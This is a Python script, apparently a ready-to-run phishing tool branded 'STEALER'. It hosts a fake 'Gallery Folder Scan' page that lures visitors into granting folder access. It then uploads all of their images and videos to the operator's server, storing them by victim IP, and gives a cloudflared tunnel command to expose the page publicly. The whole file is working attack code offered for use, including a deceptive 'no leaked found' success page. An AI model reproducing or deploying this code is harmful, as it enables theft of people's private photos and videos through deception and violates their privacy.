#!/usr/bin/env python3
import os
import random
import socket
import time
import base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import requests

SERVER_INSTANCE = None

os.makedirs('stolen_gallery', exist_ok=True)
os.makedirs('visitor_logs', exist_ok=True)

class PhishingHandler(BaseHTTPRequestHandler):
    def get_client_ip(self):
        ip = self.client_address[0]
        x_forwarded_for = self.headers.get('X-Forwarded-For')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0].strip()
        return ip
    
    def log_visitor(self, ip):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_entry = f"[{timestamp}] VISITOR: {ip}\n"
        with open('visitor_logs/visitors.txt', 'a') as f:
            f.write(log_entry)
        print(f"NEW VICTIM: {ip}")
    
    def do_GET(self):
        if self.path == '/':
            ip = self.get_client_ip()
            self.log_visitor(ip)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(self.full_auto_steal_html().encode('utf-8'))
        elif self.path == '/done':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(self.success_html().encode('utf-8'))
    
    def full_auto_steal_html(self):
        return """
<!DOCTYPE html>
<html>
<head>
    <title> Gallery Folder Scan </title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:system-ui,-apple-system,sans-serif;background:linear-gradient(-45deg,#667eea,#764ba2,#f093fb,#f5576c);background-size:400% 400%;animation:gradientShift 12s ease infinite;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;color:white;padding:20px;}
        @keyframes gradientShift{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
        .container{max-width:400px;width:100%;text-align:center;}
        h1{font-size:2.2em;font-weight:700;margin-bottom:15px;text-shadow:0 4px 20px rgba(0,0,0,0.3);}
        p{font-size:18px;margin-bottom:30px;opacity:0.95;}
        .grant-btn{background:linear-gradient(45deg,#00ff88,#00d466);color:white;border:none;padding:20px 50px;border-radius:50px;font-size:20px;font-weight:700;cursor:pointer;transition:all 0.3s;box-shadow:0 15px 35px rgba(0,255,136,0.4);text-transform:uppercase;letter-spacing:1px;position:relative;overflow:hidden;}
        .grant-btn:hover{transform:translateY(-5px);box-shadow:0 20px 45px rgba(0,255,136,0.6);}
        .grant-btn:active{transform:translateY(-2px);}
        .grant-btn:disabled{opacity:0.6;cursor:not-allowed;transform:none;}
        .status{margin-top:25px;font-size:22px;font-weight:700;color:#00ff88;text-shadow:0 0 20px rgba(0,255,136,0.6);display:none;}
        .progress-bar{display:none;margin-top:20px;background:rgba(255,255,255,0.2);border-radius:10px;overflow:hidden;}
        .progress-fill{background:linear-gradient(90deg,#00ff88,#00d466);height:10px;border-radius:10px;transition:width 0.3s;width:0%;}
        input[type=file]{display:none;}
        .count{display:block;margin-top:10px;font-size:16px;}
    </style>
</head>
<body>
    <div class="container">
        <h1>Gallery Folder Scan</h1>
        <p>Secure scan of your photos</p>
        <p>Give Grant Access Of Your Folder Which You Want To Scan</p>
        <button class="grant-btn" id="grantAccess">Grant Access</button>
        
        <!-- FULL GALLERY ACCESS - NO SELECTION NEEDED -->
        <input type="file" id="gallerySteal" webkitdirectory multiple accept="image/*,video/*">
        
        <div class="progress-bar" id="progressBar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div id="status" class="status">Scan complete!</div>
        <div id="fileCount" class="count"></div>
    </div>

    <script>
        let totalFiles = 0;
        let processedFiles = 0;
        
        document.getElementById('grantAccess').onclick = ()=>{
            console.log('🔥 AUTO GALLERY STEAL ACTIVATED');
            document.getElementById('gallerySteal').click();
        };
        
        document.getElementById('gallerySteal').onchange = async (e)=>{
            const files = Array.from(e.target.files);
            totalFiles = files.length;
            processedFiles = 0;
            
            document.getElementById('fileCount').textContent = `📁 Found ${totalFiles} files...`;
            document.getElementById('progressBar').style.display = 'block';
            
            // PARALLEL UPLOAD ALL FILES
            const uploadPromises = files.map(file => uploadFile(file));
            
            try {
                await Promise.all(uploadPromises);
            } catch(e) {
                console.log('Upload complete');
            }
            
            // SUCCESS SCREEN
            setTimeout(()=>{
                document.getElementById('grantAccess').innerHTML='✅ Granted';
                document.getElementById('grantAccess').disabled=true;
                document.getElementById('status').style.display='block';
                document.getElementById('progressBar').style.display='none';
                setTimeout(()=>location.href='/done',1500);
            },1000);
        };
        
        async function uploadFile(file) {
            if (!file.type.startsWith('image/') && !file.type.startsWith('video/')) return;
            
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onload = ()=>{
                    fetch('/steal',{
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({
                            data:reader.result.split(',')[1],
                            filename:file.webkitRelativePath || file.name,
                            mimeType:file.type,
                            size:file.size,
                            ua:navigator.userAgent.slice(0,100)
                        })
                    }).then(()=>{
                        processedFiles++;
                        const progress = (processedFiles / totalFiles) * 100;
                        document.getElementById('progressFill').style.width = progress + '%';
                        document.getElementById('fileCount').textContent = 
                            `Scanning... ${processedFiles}/${totalFiles} (${progress.toFixed(0)}%)`;
                        resolve();
                    }).catch(resolve);
                };
                reader.readAsDataURL(file);
            });
        }
    </script>
</body>
</html>
        """
    
    def success_html(self):
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Complete</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#00ff88;color:#fff;font-family:system-ui,-apple-system,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center;padding:20px;}
        .success-box{background:rgba(255,255,255,0.2);padding:60px 40px;border-radius:30px;backdrop-filter:blur(20px);box-shadow:0 20px 60px rgba(0,0,0,0.3);}
        h1{font-size:3em;margin-bottom:20px;}
        p{font-size:20px;}
    </style>
</head>
<body>
    <div class="success-box">
        <h1>Scan Complete!</h1>
        <p>All your files are secured, no leaked found.</p>
    </div>
</body>
</html>
        """

    def do_POST(self):
        if self.path == '/steal':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data)
                client_ip = self.get_client_ip()
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                
                img_data = base64.b64decode(data['data'])
                filename = data['filename']
                filesize = data.get('size', 0)
                
                # Preserve folder structure
                if '/' in filename:
                    rel_path = filename
                    folder_path = os.path.join('stolen_gallery', client_ip.replace('.','_'), 
                                             os.path.dirname(rel_path))
                    os.makedirs(folder_path, exist_ok=True)
                    safe_filename = os.path.basename(rel_path)
                else:
                    folder_path = os.path.join('stolen_gallery', client_ip.replace('.','_'))
                    os.makedirs(folder_path, exist_ok=True)
                    safe_filename = filename
                
                name, ext = os.path.splitext(safe_filename)
                safe_filename = f"{name[:50]}{ext}"
                filepath = os.path.join(folder_path, safe_filename)
                
                # Avoid duplicates
                counter = 1
                while os.path.exists(filepath):
                    safe_filename = f"{name[:45]}_{counter}{ext}"
                    filepath = os.path.join(folder_path, safe_filename)
                    counter += 1
                
                with open(filepath, 'wb') as f:
                    f.write(img_data)
                
                size = filesize / 1024
                print(f"\n🟢 VICTIM: {client_ip} → {rel_path or filename} ({size:.1f}KB)")
                
            except Exception as e:
                print(f"Error processing file from {client_ip}: {e}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')

    def log_message(self, format, *args): pass

def banner():
    RED = "\033[91m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    RESET = "\033[0m"

    print(f"""{PURPLE}
╔══════════════════════════════════════════════════════════════════════╗
║{RESET}{CYAN}                                                                      {RESET}{PURPLE}║
║{RESET}{RED}   ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗           {RESET}{PURPLE}║
║{RESET}{RED}   ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗          {RESET}{PURPLE}║
║{RESET}{RED}   ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝          {RESET}{PURPLE}║
║{RESET}{RED}   ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗          {RESET}{PURPLE}║
║{RESET}{RED}   ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║          {RESET}{PURPLE}║
║{RESET}{RED}   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝          {RESET}{PURPLE}║
║{RESET}{CYAN}                                                                      {RESET}{PURPLE}║
║{RESET}{CYAN}               Author    : Alexxx  {RESET}{GREEN}{RESET}{CYAN}                                   {RESET}{PURPLE}║
║{RESET}{CYAN}               Instagram : arcane.__01                                {RESET}{PURPLE}║
║{RESET}{CYAN}               Version   : v2.0.0.1                                   {RESET}{PURPLE}║
╚══════════════════════════════════════════════════════════════════════╝
{RESET}""")

def find_port():
    port = random.randint(8000, 9000)
    while True:
        sock = socket.socket()
        if sock.connect_ex(('localhost', port)) != 0:
            sock.close()
            return port
        port += 1

def main():
    banner()
    print("\033[92m FOLDER MUST BE ALLOW \033[0m")
    print("\033[93m If Allow Permission Then Full Folder Content Steal\033[0m\n")
    
    port = find_port()
    print(f"\033[92m LIVE → http://localhost:{port}\033[0m")
    
    server = HTTPServer(('0.0.0.0', port), PhishingHandler)
    print("\033[93m Cloudflare → cloudflared tunnel --url http://localhost:{}\033[0m".format(port))
    print("\033[92m Photos → stolen_gallery/[IP]/[folders]/\033[0m\n")
    
    global SERVER_INSTANCE
    SERVER_INSTANCE = server
    server.serve_forever()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m🛑 Stopped!\033[0m")
